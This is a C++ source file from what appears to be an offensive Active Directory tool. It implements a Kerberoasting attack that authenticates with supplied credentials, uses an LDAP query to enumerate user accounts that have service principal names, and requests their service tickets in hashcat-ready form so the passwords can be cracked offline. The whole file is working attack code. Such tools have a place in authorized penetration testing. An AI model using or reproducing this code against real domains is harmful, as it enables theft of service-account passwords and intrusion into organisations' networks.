#include <iostream>
#include "Attacks.h"
#include "../connections/LDAPConnection.h"
#include <string>
#include <vector>
#include "../connections/KerberosInteraction.h"
#include "../utils/Colors.h"

Attacks::Kerberoast::Kerberoast(LDAPConnection& _conn, const std::string& username, const std::string& password) : conn(_conn) {
    krb5.requestTGT(username, password);
}

std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN) {
    std::cout << "[*] Enumerating kerberoastable users" << std::endl;

    std::string query = "(&(servicePrincipalName=*)(!(objectClass=computer)))";
    std::vector<std::string> attrs = {"sAMAccountName", "servicePrincipalName"};
    std::vector<std::string> kerberoastable_users;
    std::vector<std::string> kerberoastable_users_spns;

    auto results = conn.executeQuery(baseDN, query, attrs);

    for (const auto& userObject : results) {
        auto user = userObject.find("sAMAccountName");
        auto spn = userObject.find("servicePrincipalName");

        if (user != userObject.end() && !user->second.empty()) {
            std::string username = user->second.front();
            if (username == "krbtgt") {
                continue;
            }
            std::cout << Colors::COLOR_YELLOW << "  [+] User: " << username << Colors::COLOR_RESET << std::endl;
            kerberoastable_users.push_back(username);
            if (spn != userObject.end()) {
                for (const auto& _spn : spn->second) {
                    kerberoastable_users_spns.push_back(_spn); 
                }
            }
        }
    }
    return kerberoastable_users;
}

std::pair<std::string, std::string> Attacks::Kerberoast::requestTicket(
    const std::string& username_spn, const std::string& username, 
    bool to_file) {
    
    std::pair<std::string, std::string> to_save;
    std::string hashcat_ticket = krb5.requestTGS(username_spn, username);
    if (!to_file) {
        std::cout << hashcat_ticket << "\n\n";
        return {"", ""};
    } else {
        return {username_spn, hashcat_ticket};
    }
        
}
